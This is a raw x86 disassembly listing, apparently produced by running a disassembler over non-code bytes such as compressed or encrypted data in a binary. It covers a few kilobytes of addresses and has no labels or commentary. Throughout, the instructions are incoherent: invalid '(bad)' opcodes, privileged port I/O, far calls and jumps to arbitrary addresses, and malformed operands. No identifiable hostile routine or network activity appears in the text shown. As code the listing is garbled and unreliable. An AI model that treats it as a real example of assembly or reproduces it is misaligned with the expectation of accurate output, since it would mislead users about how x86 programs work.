  41d9d5:	add    ah,al
  41d9d7:	ins    BYTE PTR es:[edi],dx
  41d9d8:	pop    es
  41d9d9:	pushf  
  41d9da:	scas   eax,DWORD PTR es:[edi]
  41d9db:	(bad)  
  41d9dc:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d9e0:	outs   dx,DWORD PTR ds:[esi]
  41d9e1:	paddusw mm0,QWORD PTR gs:[esi+0x13e67d3]
  41d9e9:	add    BYTE PTR [eax],al
  41d9eb:	add    DWORD PTR [eax],eax
  41d9ed:	add    BYTE PTR [edi+0x70],dl
  41d9f0:	inc    esp
  41d9f1:	and    edi,esp
  41d9f3:	neg    DWORD PTR [edi+0x7e]
  41d9f6:	mov    ecx,0x1c6ccfb3
  41d9fb:	sti    
  41d9fc:	call   FWORD PTR [ecx]
  41d9fe:	pop    ds
  41d9ff:	inc    ebp
  41da00:	jl     0x41da20
  41da02:	push   ecx
  41da03:	imul   esp,DWORD PTR [esi],0x1a96db06
  41da09:	scas   eax,DWORD PTR es:[edi]
  41da0a:	addr16 mov dl,0x46
  41da0d:	push   ss
  41da0e:	jecxz  0x41da62
  41da10:	xchg   ecx,eax
  41da11:	ficomp DWORD PTR [ebx-0x2a]
  41da14:	sbb    al,0xc7
  41da16:	xchg   DWORD PTR [edx+0x4cb03bf8],ecx
  41da1c:	sbb    bh,BYTE PTR [edx+0x4acc89ff]
  41da22:	lahf   
  41da23:	jg     0x41da7a
  41da25:	and    al,0x16
  41da27:	rcl    ah,0xd1
  41da2a:	ins    BYTE PTR es:[edi],dx
  41da2b:	in     al,0x8
  41da2d:	cli    
  41da2e:	sbb    ebx,DWORD PTR [ebx-0x634cf46b]
  41da34:	call   FWORD PTR [ebp+0x64]
  41da37:	xchg   ebp,eax
  41da38:	jp     0x41da5a
  41da3a:	in     eax,0x2c
  41da3c:	jp     0x41da29
  41da3e:	and    eax,DWORD PTR [edx+0x62f49d97]
  41da44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da45:	je     0x41da4b
  41da47:	mov    ebp,0xc33e20fc
  41da4c:	neg    BYTE PTR [edi]
  41da4e:	nop
  41da4f:	xchg   esp,eax
  41da50:	mov    bh,0x2d
  41da52:	or     BYTE PTR [eax+0x5e],al
  41da55:	std    
  41da56:	pop    edx
  41da57:	push   esp
  41da58:	mov    WORD PTR [ebp+0x40ef5821],gs
  41da5e:	cmp    ebp,DWORD PTR [edx]
  41da60:	pop    edx
  41da61:	enter  0x1630,0xc6
  41da65:	test   DWORD PTR ds:0x2fb16299,esp
  41da6b:	stc    
  41da6c:	fs push ds
  41da6e:	lds    esi,FWORD PTR [ebx+0x48]
  41da71:	mov    al,ds:0xee6ae137
  41da76:	cmp    ch,BYTE PTR [edx+0x52]
  41da79:	(bad)  
  41da7a:	popf   
  41da7b:	addr16 mov ebp,0x12975f75
  41da81:	bound  ebx,QWORD PTR [edx+edi*2-0xa]
  41da85:	dec    edi
  41da86:	in     al,0x20
  41da88:	or     DWORD PTR [edx+ebp*2-0x5],edi
  41da8c:	inc    esi
  41da8d:	sub    eax,esp
  41da8f:	leave  
  41da90:	sub    BYTE PTR [eax+0x71],dl
  41da93:	add    BYTE PTR fs:[ecx-0x52],al
  41da97:	loop   0x41da2e
  41da99:	enter  0x7915,0x17
  41da9d:	or     dl,dh
  41da9f:	lahf   
  41daa0:	in     eax,dx
  41daa1:	sub    BYTE PTR [edi+0x47a01bc4],ch
  41daa7:	fwait
  41daa8:	into   
  41daa9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41daaa:	push   ebx
  41daab:	jp     0x41dafe
  41daad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41daae:	sbb    al,0xc7
  41dab0:	fisttp DWORD PTR [eax+0x10853d1f]
  41dab6:	das    
  41dab7:	dec    ebx
  41dab8:	push   ebx
  41dab9:	mov    gs,WORD PTR [esi-0x1a78a9c0]
  41dabf:	(bad)  [ebx*2+0x24ca497a]
  41dac6:	rcl    DWORD PTR [ebx+0x48703af9],cl
  41dacc:	cmp    DWORD PTR [ecx-0x774a36c4],ebx
  41dad2:	arpl   WORD PTR [edx+0xb],si
  41dad5:	adc    cl,dl
  41dad7:	push   ebp
  41dad8:	scas   eax,DWORD PTR es:[edi]
  41dad9:	push   ebp
  41dada:	or     DWORD PTR ds:0x313cd686,esp
  41dae0:	cmp    BYTE PTR [ebp-0x2321f88f],dl
  41dae6:	mov    WORD PTR [ebx],?
  41dae8:	jno    0x41da6f
  41daea:	into   
  41daeb:	pop    esp
  41daec:	ins    DWORD PTR es:[edi],dx
  41daed:	sub    DWORD PTR [eax],eax
	...
  41db53:	add    BYTE PTR [eax],al
  41db55:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41db5c:	cmp    al,0x5f
  41db5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db5f:	push   edi
  41db60:	sbb    ebp,0xffffffa1
  41db63:	adc    al,0x9f
  41db65:	lea    esp,[edi+0x3f]
  41db68:	add    DWORD PTR [eax],eax
  41db6a:	add    BYTE PTR [ecx],al
  41db6c:	add    BYTE PTR [eax],al
  41db6e:	cmp    DWORD PTR [ebp+0x16],eax
  41db71:	ins    DWORD PTR es:[edi],dx
  41db72:	push   ebx
  41db73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db74:	shr    DWORD PTR [edi],1
  41db76:	ds add eax,0xb137102d
  41db7c:	cli    
  41db7d:	inc    esi
  41db7e:	ds pop ebx
  41db80:	int3   
  41db81:	outs   dx,BYTE PTR ds:[esi]
  41db82:	fwait
  41db83:	cli    
  41db84:	loope  0x41db22
  41db86:	jp     0x41dbca
  41db88:	pop    esi
  41db89:	dec    ebx
  41db8a:	int3   
  41db8b:	adc    ch,BYTE PTR [ebx-0x5460e7e3]
  41db91:	mov    BYTE PTR [ecx-0x66bfaf9b],bh
  41db97:	test   DWORD PTR [edx],esp
  41db99:	repnz pushf 
  41db9b:	popf   
  41db9c:	cmc    
  41db9d:	push   esi
  41db9e:	ins    DWORD PTR es:[edi],dx
  41db9f:	hlt    
  41dba0:	mov    ch,0x63
  41dba2:	ror    BYTE PTR [eax+0xe],1
  41dba5:	call   0xd81b:0xef76559f
  41dbac:	pop    es
  41dbad:	pop    ss
  41dbae:	jne    0x41dc25
  41dbb0:	icebp  
  41dbb1:	out    dx,eax
  41dbb2:	aam    0xbd
  41dbb4:	mov    eax,ds:0x18f0d1a4
  41dbb9:	pusha  
  41dbba:	dec    ecx
  41dbbb:	repnz push 0x60
  41dbbe:	popa   
  41dbbf:	shl    ah,1
  41dbc1:	lds    ecx,FWORD PTR [edx+0x2f]
  41dbc4:	jne    0x41db63
  41dbc6:	pop    ds
  41dbc7:	sub    al,0x57
  41dbc9:	loopne 0x41dc47
  41dbcb:	loopne 0x41dc14
  41dbcd:	ss cwde 
  41dbcf:	sbb    eax,0x98b48a0a
  41dbd4:	xor    BYTE PTR [edi],0xeb
  41dbd7:	jle    0x41dc3c
  41dbd9:	stos   BYTE PTR es:[edi],al
  41dbda:	adc    al,0xd3
  41dbdc:	sub    ah,bl
  41dbde:	dec    edi
  41dbdf:	xlat   BYTE PTR ds:[ebx]
  41dbe0:	mov    al,0x3b
  41dbe2:	hlt    
  41dbe3:	dec    ecx
  41dbe4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbe5:	lods   eax,DWORD PTR ds:[esi]
  41dbe6:	pusha  
  41dbe7:	out    0xa8,al
  41dbe9:	xor    edi,DWORD PTR [edx]
  41dbeb:	fiadd  DWORD PTR [edi+ebp*4-0x448cd4cf]
  41dbf2:	scas   eax,DWORD PTR es:[edi]
  41dbf3:	add    eax,0x2c69a40
  41dbf8:	iret   
  41dbf9:	out    dx,al
  41dbfa:	push   edi
  41dbfb:	loop   0x41dc14
  41dbfd:	rcl    DWORD PTR [edx-0x2dc07fdc],1
  41dc03:	sub    al,0x43
  41dc05:	push   0xd2e827d5
  41dc0a:	mov    ?,ebx
  41dc0c:	push   edx
  41dc0d:	rcr    eax,0x23
  41dc10:	pop    es
  41dc11:	call   0xe6a0f6ee
  41dc16:	lock inc edx
  41dc18:	sti    
  41dc19:	mov    cl,0xab
  41dc1b:	pop    esp
  41dc1c:	je     0x41dc21
  41dc1e:	jnp    0x41dc5e
  41dc20:	jmp    0x33becbea
  41dc25:	seto   BYTE PTR [edx]
  41dc28:	inc    ebp
  41dc29:	dec    ecx
  41dc2a:	jns    0x41dbcf
  41dc2c:	push   esp
  41dc2d:	pop    es
  41dc2e:	push   ds
  41dc2f:	imul   edx,eax,0xffffffe2
  41dc32:	es jmp 0x41dc53
  41dc35:	jge    0x41dbc0
  41dc37:	ins    DWORD PTR es:[edi],dx
  41dc38:	nop
  41dc39:	pop    edi
  41dc3a:	outs   dx,BYTE PTR ds:[esi]
  41dc3b:	sub    eax,0xce1264af
  41dc40:	(bad)  
  41dc42:	out    dx,al
  41dc43:	sub    eax,0x5a68268d
  41dc48:	mov    ah,BYTE PTR [ebx*4-0x36cfe79d]
  41dc4f:	inc    ecx
  41dc50:	sbb    edi,DWORD PTR cs:[ebp+0x611cdf1a]
  41dc57:	inc    ebp
  41dc58:	fstp   TBYTE PTR [eax+0x71cb02e4]
  41dc5e:	adc    ch,BYTE PTR [ecx+0x4d3744f]
  41dc64:	mov    DWORD PTR ds:0x49e6b2c4,eax
  41dc6a:	push   esi
  41dc6b:	stc    
  41dc6c:	xchg   DWORD PTR ds:0x0,edi
	...
  41dcd6:	outs   dx,DWORD PTR ds:[esi]
  41dcd7:	retf   0x9815
  41dcda:	mov    ch,0xdf
  41dcdc:	out    dx,eax
  41dcdd:	jmp    DWORD PTR [edi-0x34f2fb0]
  41dce3:	hlt    
  41dce4:	in     al,0xe7
  41dce6:	addr16 inc eax
  41dce8:	add    DWORD PTR [eax],eax
  41dcea:	add    BYTE PTR [ecx],al
  41dcec:	add    BYTE PTR [eax],al
  41dcee:	push   esp
  41dcef:	xchg   BYTE PTR [ebx],cl
  41dcf1:	outs   dx,BYTE PTR ds:[esi]
  41dcf2:	imul   edx,DWORD PTR [eax],0xcc357924
  41dcf8:	cs push ds
  41dcfa:	mov    ch,0xab
  41dcfc:	sub    al,0x2f
  41dcfe:	sbb    eax,0x73964081
  41dd03:	imul   ebp,edi,0xa9313d8f
  41dd09:	jo     0x41dcf5
  41dd0b:	inc    esp
  41dd0c:	jns    0x41dd2e
  41dd0e:	push   cs
  41dd0f:	adc    BYTE PTR [eax+0x52],0x97
  41dd13:	push   esi
  41dd14:	mov    ebx,0xa373c172
  41dd19:	inc    ebx
  41dd1a:	xor    eax,0x46f18d5f
  41dd1f:	mov    WORD PTR [ecx+0x5ef95acf],cs
  41dd25:	or     ecx,DWORD PTR [ebx-0x4a]
  41dd28:	into   
  41dd29:	retf   0xfc87
  41dd2c:	and    edx,edi
  41dd2e:	popf   
  41dd2f:	jae    0x41dd5c
  41dd31:	add    DWORD PTR [edx],edi
  41dd33:	push   eax
  41dd34:	mov    ah,0x2a
  41dd36:	lea    ecx,[ebx-0x26642f70]
  41dd3c:	mov    eax,0x2eb79f13
  41dd41:	sub    eax,DWORD PTR [ebx-0x49e15221]
  41dd47:	cld    
  41dd48:	fwait
  41dd49:	in     al,0xaf
  41dd4b:	out    dx,eax
  41dd4c:	jecxz  0x41dd92
  41dd4e:	lods   eax,DWORD PTR ds:[esi]
  41dd4f:	leave  
  41dd50:	mov    cl,0x11
  41dd52:	sub    al,0x3c
  41dd54:	cmp    esp,ebp
  41dd56:	(bad)  [esi+0x799a318e]
  41dd5c:	pop    esi
  41dd5d:	mov    DWORD PTR [edx+ebx*2+0x8],0x3285ddf4
  41dd65:	out    dx,eax
  41dd66:	data16 mov al,ds:0xe039b91a
  41dd6c:	jne    0x41ddc4
  41dd6e:	ds scas eax,DWORD PTR es:[edi]
  41dd70:	in     al,dx
  41dd71:	xchg   esi,eax
  41dd72:	pop    esi
  41dd73:	cmp    eax,0x63aa0164
  41dd78:	out    0x69,al
  41dd7a:	mov    ds:0xa90da0c8,al
  41dd7f:	loope  0x41dd43
  41dd81:	(bad)  
  41dd83:	or     dl,bh
  41dd85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd86:	mov    ebx,0xa438869d
  41dd8b:	mov    ?,WORD PTR [esi-0x6f]
  41dd8e:	test   eax,0x8298cc6e
  41dd93:	aaa    
  41dd94:	mov    bl,0xc6
  41dd96:	bound  ebp,QWORD PTR [bx+0x4ebb]
  41dd9b:	mov    bh,0xc9
  41dd9d:	inc    esp
  41dd9e:	enter  0x1622,0x89
  41dda2:	mov    edi,edx
  41dda4:	adc    esp,DWORD PTR [edi]
  41dda6:	pop    ss
  41dda7:	sub    ebp,esp
  41dda9:	cld    
  41ddaa:	in     eax,dx
  41ddab:	mov    ecx,DWORD PTR fs:[esp+edx*8+0x38]
  41ddb0:	aad    0x73
  41ddb2:	shr    bl,cl
  41ddb4:	sub    DWORD PTR [edx-0x6c0f0b72],ebx
  41ddba:	rcr    DWORD PTR [eax+0x2d],cl
  41ddbd:	inc    ebp
  41ddbe:	ret    
  41ddbf:	xor    al,0x7b
  41ddc1:	call   0xe2ddff26
  41ddc6:	fucomp st(0)
  41ddc8:	daa    
  41ddc9:	mov    eax,gs
  41ddcb:	and    eax,0x5ca82ad0
  41ddd0:	div    DWORD PTR [ecx-0x3c]
  41ddd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ddd4:	sbb    dh,BYTE PTR [edi+0x6e]
  41ddd7:	rol    BYTE PTR [edx],1
  41ddd9:	test   BYTE PTR [edi-0x4],al
  41dddc:	sbb    dh,BYTE PTR [ebx-0x7e]
  41dddf:	ror    DWORD PTR [eax+0x26980bb3],0xc6
  41dde6:	out    dx,eax
  41dde7:	adc    ch,BYTE PTR [edx+0x1a]
  41ddea:	fcom   DWORD PTR [esi+esi*1-0x6a]
	...
  41de56:	and    bl,dh
  41de58:	das    
  41de59:	cmp    bh,0xde
  41de5c:	lods   eax,DWORD PTR ds:[esi]
  41de5d:	repz pop ds
  41de5f:	mov    bl,BYTE PTR [esi-0x41]
  41de62:	add    al,0x2c
  41de64:	mov    esp,0x1416742
  41de69:	add    BYTE PTR [eax],al
  41de6b:	add    DWORD PTR [eax],eax
  41de6d:	add    BYTE PTR [ebp+0x23cd118e],ch
  41de73:	sbb    cl,dl
  41de75:	or     DWORD PTR [edi],edi
  41de77:	cld    
  41de78:	xlat   BYTE PTR ds:[ebx]
  41de79:	scas   al,BYTE PTR es:[edi]
  41de7a:	or     al,0xeb
  41de7c:	cmp    eax,0x5f0e4700
  41de81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de82:	ins    DWORD PTR es:[edi],dx
  41de83:	dec    ecx
  41de84:	lods   eax,DWORD PTR ds:[esi]
  41de85:	dec    ebp
  41de86:	jle    0x41de1c
  41de88:	imul   ebx,DWORD PTR [eax-0xa],0x54
  41de8c:	sbb    BYTE PTR [edi],al
  41de8e:	es dec ebp
  41de90:	push   es
  41de91:	mov    al,0x8d
  41de93:	scas   al,BYTE PTR es:[edi]
  41de94:	pop    es
  41de95:	push   ebp
  41de96:	or     cl,dl
  41de98:	sahf   
  41de99:	sbb    DWORD PTR [edx],0xe72dbc18
  41de9f:	cwde   
  41dea0:	or     BYTE PTR [esi+0x23],cl
  41dea3:	loop   0x41de73
  41dea5:	loopne 0x41deb8
  41dea7:	imul   esp,DWORD PTR [ecx-0x17a5783a],0x44
  41deae:	pop    ds
  41deaf:	enter  0xe058,0x35
  41deb3:	dec    esi
  41deb4:	dec    esp
  41deb5:	jno    0x41dea9
  41deb7:	adc    BYTE PTR [edi+0x47],0xb8
  41debb:	rol    esi,1
  41debd:	lods   al,BYTE PTR ds:[esi]
  41debe:	stos   BYTE PTR es:[edi],al
  41debf:	shl    BYTE PTR [ebx-0x574cb747],0xe4
  41dec6:	xchg   dh,cl
  41dec8:	dec    esp
  41dec9:	xchg   ebx,eax
  41deca:	xlat   BYTE PTR ds:[ebx]
  41decb:	push   ebp
  41decc:	lock int3 
  41dece:	loope  0x41de8c
  41ded0:	test   DWORD PTR [ebp-0xd322100],ebp
  41ded6:	xchg   ecx,eax
  41ded7:	cwde   
  41ded8:	push   esp
  41ded9:	mov    ebx,0x8add6660
  41dede:	rcl    DWORD PTR [ebx],cl
  41dee0:	xchg   ecx,eax
  41dee1:	push   edi
  41dee2:	push   eax
  41dee3:	xor    al,0x1c
  41dee5:	mov    dh,0x4c
  41dee7:	hlt    
  41dee8:	or     cl,BYTE PTR [ecx]
  41deea:	or     DWORD PTR [ebx],ecx
  41deec:	or     edi,eax
  41deee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41deef:	in     eax,0x3a
  41def1:	aaa    
  41def2:	inc    ebp
  41def3:	dec    ebp
  41def4:	fadd   QWORD PTR [edx-0x5b]
  41def7:	cmc    
  41def8:	scas   eax,DWORD PTR es:[edi]
  41def9:	inc    ecx
  41defa:	push   0x47
  41defc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41defd:	les    esi,FWORD PTR [edx+0x7c]
  41df00:	imul   ebp,DWORD PTR [ebx-0x6d],0xec33caf0
  41df07:	and    cl,BYTE PTR [esi+0x23]
  41df0a:	(bad)  
  41df0b:	pop    esi
  41df0c:	xor    ah,dh
  41df0e:	int3   
  41df0f:	cmp    DWORD PTR [ecx+0x2fa4cebd],ecx
  41df15:	sub    DWORD PTR [edi+ebp*4],0xd2ef4950
  41df1c:	jns    0x41df7a
  41df1e:	mov    esp,0x969fc016
  41df23:	cmp    ebx,edi
  41df25:	lock adc DWORD PTR [edx-0x5d026dd],esp
  41df2c:	or     DWORD PTR [edi],eax
  41df2e:	cld    
  41df2f:	call   0x3ae6537c
  41df34:	and    bh,BYTE PTR [ebx+0x8]
  41df37:	mov    ecx,0x474291c5
  41df3c:	stos   BYTE PTR es:[edi],al
  41df3d:	cmp    dh,BYTE PTR [edx]
  41df3f:	popa   
  41df40:	cmc    
  41df41:	pop    ss
  41df42:	push   eax
  41df43:	adc    edx,DWORD PTR [ebp-0x51745f62]
  41df49:	gs and dl,bl
  41df4c:	cmp    bh,bh
  41df4e:	arpl   WORD PTR [edx-0x1c],bx
  41df51:	push   esp
  41df52:	or     BYTE PTR [esi+0x66],ch
  41df55:	call   0x4a9c4f5b
  41df5a:	sbb    al,0xb6
  41df5c:	push   ebp
  41df5d:	pop    edx
  41df5e:	pop    ecx
  41df5f:	pop    ebp
  41df60:	mov    eax,0x95c250ab
  41df65:	sub    BYTE PTR [eax-0x44],bl
  41df68:	in     eax,0xcc
  41df6a:	lock leave 
  41df6c:	inc    ebx
  41df6d:	cdq    
	...
  41dfd6:	aas    
  41dfd7:	daa    
  41dfd8:	push   ss
  41dfd9:	cld    
  41dfda:	push   ds
  41dfdb:	std    
  41dfdc:	jmp    edi
  41dfde:	dec    edi
  41dfdf:	push   0x66479ce9
  41dfe4:	xor    DWORD PTR [esi+0x67],eax
  41dfe7:	inc    edx
  41dfe8:	add    DWORD PTR [eax],eax
  41dfea:	add    BYTE PTR [ecx],al
  41dfec:	add    BYTE PTR [eax],al
  41dfee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfef:	and    DWORD PTR [esi+0x238d320e],edx
  41dff5:	mov    dh,0xe5
  41dff7:	xchg   esi,eax
  41dff8:	aam    0x5e
  41dffa:	iret   
  41dffb:	out    dx,eax
  41dffc:	pop    ss
  41dffd:	fist   WORD PTR [ecx+0x6a205fc5]
  41e003:	xchg   esi,eax
  41e004:	push   ecx
  41e005:	(bad)  
  41e006:	in     eax,0xe8
  41e008:	je     0x41dfd6
  41e00a:	ins    DWORD PTR es:[edi],dx
  41e00b:	jne    0x41e044
  41e00d:	pop    es
  41e00e:	xchg   ecx,eax
  41e00f:	enter  0x5aba,0x38
  41e013:	xchg   DWORD PTR [eax+0x44],esp
  41e016:	sbb    ecx,DWORD PTR [edi+0x9]
  41e019:	daa    
  41e01a:	and    DWORD PTR [esi-0x65],eax
  41e01d:	popa   
  41e01e:	gs inc esi
  41e020:	xchg   esp,eax
  41e021:	das    
  41e022:	arpl   WORD PTR [esp+edi*2],di
  41e025:	ins    BYTE PTR es:[edi],dx
  41e026:	ret    0xa7cf
  41e029:	sub    eax,0xcc482b08
  41e02e:	xlat   BYTE PTR ds:[ebx]
  41e02f:	or     eax,0x29cfd156
  41e034:	and    esp,ecx
  41e036:	lods   eax,DWORD PTR ds:[esi]
  41e037:	pop    es
  41e038:	xlat   BYTE PTR ds:[ebx]
  41e039:	push   edi
  41e03a:	add    eax,ecx
  41e03c:	inc    edi
  41e03d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e03e:	mov    dh,0x3f
  41e040:	dec    edi
  41e041:	jne    0x41e06b
  41e043:	clc    
  41e044:	popf   
  41e045:	lock (bad) 
  41e047:	shr    esp,1
  41e049:	adc    eax,DWORD PTR [ebp+0x59e98b67]
  41e04f:	pop    esi
  41e050:	or     eax,0x27450b5e
  41e055:	stos   DWORD PTR es:[edi],eax
  41e056:	pushf  
  41e057:	adc    al,0xb3
  41e059:	or     ebx,DWORD PTR [ebx+0x42]
  41e05c:	pop    es
  41e05d:	(bad)  
  41e05e:	cld    
  41e05f:	adc    BYTE PTR [ebp-0x60e81c3],bh
  41e065:	adc    BYTE PTR cs:[ebp-0x6ea11c74],0xa6
  41e06d:	pop    ecx
  41e06e:	in     al,0x66
  41e070:	adc    dl,dl
  41e072:	mov    ecx,0xa45e7491
  41e077:	pop    edi
  41e078:	lock jl 0x41e08c
  41e07b:	arpl   WORD PTR [esp+ebp*4],di
  41e07e:	outs   dx,DWORD PTR ds:[esi]
  41e07f:	lods   al,BYTE PTR ds:[esi]
  41e080:	outs   dx,DWORD PTR ds:[esi]
  41e081:	pop    esi
  41e082:	and    esi,DWORD PTR [edi+edx*1+0x11e02f9f]
  41e089:	std    
  41e08a:	(bad)  
  41e08b:	mov    dl,0xa3
  41e08d:	add    eax,0x31f134d5
  41e092:	(bad)  
  41e093:	push   ss
  41e094:	retf   
  41e095:	cmp    BYTE PTR [ebp+0x34],ah
  41e098:	aaa    
  41e099:	fmul   st(2),st
  41e09b:	outs   dx,DWORD PTR ds:[esi]
  41e09c:	mov    esp,0xb3cbe3a
  41e0a1:	cld    
  41e0a2:	scas   al,BYTE PTR es:[edi]
  41e0a3:	stos   DWORD PTR es:[edi],eax
  41e0a4:	fsub   QWORD PTR [esi]
  41e0a6:	sub    al,0xdc
  41e0a8:	shl    DWORD PTR [edi-0x5f],cl
  41e0ab:	js     0x41e11f
  41e0ad:	cmp    dl,bh
  41e0af:	add    esp,DWORD PTR es:[eax-0x45]
  41e0b3:	xchg   edi,eax
  41e0b4:	fldenv [edx+0x1b]
  41e0b7:	inc    eax
  41e0b8:	jg     0x41e056
  41e0ba:	ja     0x41e06e
  41e0bc:	fisttp WORD PTR [esi-0x4335a679]
  41e0c2:	sti    
  41e0c3:	xchg   esp,eax
  41e0c4:	in     al,dx
  41e0c5:	adc    ch,dh
  41e0c7:	and    al,0xfb
  41e0c9:	xchg   ecx,eax
  41e0ca:	pop    ebx
  41e0cb:	mov    ebp,0x4b5411ba
  41e0d0:	xchg   edi,eax
  41e0d1:	ja     0x41e13c
  41e0d3:	les    esi,FWORD PTR [edx+ebp*4+0x31]
  41e0d7:	popf   
  41e0d8:	ss jecxz 0x41e12c
  41e0db:	int    0x39
  41e0dd:	ds fdiv st,st(7)
  41e0e0:	xor    al,0xb8
  41e0e2:	jb     0x41e10f
  41e0e4:	or     BYTE PTR [ecx-0x39adf8ff],ch
  41e0ea:	aam    0x8b
  41e0ec:	mov    DWORD PTR [ebp+0x0],esp
	...
  41e153:	add    BYTE PTR [eax],al
  41e155:	add    BYTE PTR [edi+0x53],cl
  41e158:	add    al,0xc
  41e15a:	sbb    al,0x5f
  41e15c:	dec    edi
  41e15d:	push   ebx
  41e15e:	out    0x6d,eax
  41e160:	aad    0x48
  41e162:	mov    bh,0x7b
  41e164:	test   eax,0x1436724
  41e169:	add    BYTE PTR [eax],al
  41e16b:	add    DWORD PTR [eax],eax
  41e16d:	add    cl,al
  41e16f:	int    0x6a
  41e171:	int3   
  41e172:	mov    esp,0xb5e601af
  41e177:	(bad)  
  41e178:	das    
  41e179:	mov    esi,0x5ef70962
  41e17e:	aad    0x26
  41e180:	dec    esp
  41e181:	pop    edi
  41e182:	cmp    ah,BYTE PTR [ecx+0x5815e10c]
  41e188:	sub    al,0x8c
  41e18a:	retf   0x4491
  41e18d:	jg     0x41e1de
  41e18f:	sub    BYTE PTR [esi-0x7b],ah
  41e192:	adc    ah,ah
  41e194:	or     ebp,DWORD PTR ss:[ebp-0x4f5c4c66]
  41e19b:	fdivr  QWORD PTR [ecx+0x4e5d41e6]
  41e1a1:	inc    edi
  41e1a2:	std    
  41e1a3:	out    0x33,al
  41e1a5:	test   BYTE PTR [edi],ch
  41e1a7:	ret    0x5b98
  41e1aa:	fwait
  41e1ab:	jg     0x41e1c9
  41e1ad:	xchg   ecx,eax
  41e1ae:	mov    bl,0x1
  41e1b0:	fmul   QWORD PTR [eax+0x1d92996b]
  41e1b6:	inc    esi
  41e1b7:	xchg   esi,eax
  41e1b8:	icebp  
  41e1b9:	dec    edi
  41e1ba:	mov    eax,0x59a94015
  41e1bf:	shl    BYTE PTR [eax-0x5ef5aede],cl
  41e1c5:	sar    ecx,cl
  41e1c7:	fsub   st(5),st
  41e1c9:	outs   dx,BYTE PTR ds:[esi]
  41e1ca:	leave  
  41e1cb:	mov    ecx,0x8550fa1f
  41e1d0:	mov    edx,0xa3ffca2c
  41e1d5:	xlat   BYTE PTR ds:[ebx]
  41e1d6:	dec    esp
  41e1d7:	and    BYTE PTR [eax+0x7188da03],bh
  41e1dd:	mov    ebp,0x5e0998e6
  41e1e2:	mov    al,ds:0x358b7a65
  41e1e7:	jae    0x41e24f
  41e1e9:	or     eax,0xda035c69
  41e1ee:	sti    
  41e1ef:	jg     0x41e24f
  41e1f1:	dec    ebx
  41e1f2:	or     bh,BYTE PTR [edx-0x1]
  41e1f5:	aaa    
  41e1f6:	or     BYTE PTR ds:0xfe4c4fcc,bh
  41e1fc:	pusha  
  41e1fd:	and    DWORD PTR [ebx+0x74],0xd00c677d
  41e204:	and    al,BYTE PTR [ebx]
  41e206:	outs   dx,BYTE PTR ds:[esi]
  41e207:	dec    edx
  41e208:	pushf  
  41e209:	jmp    0x41e1eb
  41e20b:	out    dx,eax
  41e20c:	shr    DWORD PTR ds:0x95dfaea0,0xab
  41e213:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e214:	cmp    BYTE PTR [edi-0x6ed1c9aa],bh
  41e21a:	or     DWORD PTR [ebx],esi
  41e21c:	loopne 0x41e295
  41e21e:	(bad)  [ebx-0x15]
  41e221:	push   ebx
  41e222:	stos   BYTE PTR es:[edi],al
  41e223:	xchg   al,bl
  41e225:	or     DWORD PTR [edx+0x4e6d501a],ecx
  41e22b:	inc    esi
  41e22c:	jns    0x41e2a3
  41e22e:	cld    
  41e22f:	(bad)  
  41e230:	out    0x59,eax
  41e232:	div    BYTE PTR [esi]
  41e234:	mov    cl,0xc4
  41e236:	sar    DWORD PTR [ecx],1
  41e238:	jecxz  0x41e244
  41e23a:	inc    eax
  41e23b:	into   
  41e23c:	push   edx
  41e23d:	pop    eax
  41e23e:	retf   
  41e23f:	push   ecx
  41e240:	js     0x41e200
  41e242:	je     0x41e210
  41e244:	jl     0x41e1dc
  41e246:	repnz and al,0x95
  41e249:	outs   dx,DWORD PTR ss:[esi]
  41e24b:	pop    ebp
  41e24c:	xchg   esi,eax
  41e24d:	mov    ebx,DWORD PTR [eax-0x1e]
  41e250:	xor    eax,0x623ad405
  41e255:	xchg   ebx,eax
  41e256:	into   
  41e257:	dec    ecx
  41e258:	pop    ds
  41e259:	icebp  
  41e25a:	push   edx
  41e25b:	adc    dl,BYTE PTR [edi]
  41e25d:	retf   
  41e25e:	into   
  41e25f:	push   0x5657df9f
  41e264:	xor    dl,BYTE PTR [edi-0x33]
  41e267:	sub    eax,0xe5b234f8
  41e26c:	imul   ebx,DWORD PTR [eax],0x0
	...
  41e2d6:	stos   DWORD PTR es:[edi],eax
  41e2d7:	add    dh,BYTE PTR [edi-0x1a]
  41e2da:	push   edi
  41e2dc:	mov    ebx,0x6f64c34f
  41e2e1:	or     al,0x5b
  41e2e3:	gs and BYTE PTR ss:[edi+0x44],0x1
  41e2e9:	add    BYTE PTR [eax],al
  41e2eb:	add    DWORD PTR [eax],eax
  41e2ed:	add    BYTE PTR [edi],cl
  41e2ef:	test   al,0x62
  41e2f1:	int    0x43
  41e2f3:	xor    ch,BYTE PTR [eax*4+0x3a280c67]
  41e2fa:	xchg   edx,eax
  41e2fb:	mov    cl,0x8e
  41e2fd:	push   esp
  41e2fe:	jns    0x41e366
  41e300:	xor    DWORD PTR [ebx+0x5e5dbedc],edi
  41e306:	push   eax
  41e307:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e308:	lahf   
  41e309:	jo     0x41e389
  41e30b:	bound  ecx,QWORD PTR [ecx]
  41e30d:	out    0x5f,al
  41e30f:	out    dx,al
  41e310:	sub    dl,dl
  41e312:	and    eax,0x8a444df5
  41e317:	mov    esp,0xbdb05541
  41e31c:	dec    esi
  41e31d:	aas    
  41e31e:	test   eax,0xc26be4ee
  41e323:	mov    edx,DWORD PTR [eax-0x2d]
  41e326:	dec    esp
  41e327:	fistp  WORD PTR [ebp+0x9]
  41e32a:	scas   eax,DWORD PTR es:[di]
  41e32c:	xor    dh,cl
  41e32e:	iret   
